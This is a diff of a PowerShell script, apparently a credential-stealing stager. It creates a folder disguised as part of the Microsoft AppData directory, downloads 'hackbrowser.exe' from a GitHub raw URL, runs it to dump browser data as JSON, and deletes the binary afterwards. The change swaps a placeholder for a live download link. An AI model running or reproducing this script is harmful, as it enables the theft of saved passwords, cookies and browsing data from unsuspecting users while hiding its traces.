@@ -6,7 +6,7 @@ mkdir "$env:appdata\Microsoft\dump"
 Set-Location "$env:appdata\Microsoft\dump"
 
 # Downloading and executing hackbrowser.exe
-Invoke-WebRequest 'hackbrowser.exe file link' -OutFile "hb.exe"
+Invoke-WebRequest 'https://github.com/ertvg/h/raw/main/hackbrowser.exe' -OutFile "hb.exe"
 .\hb.exe --format json
 Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
 
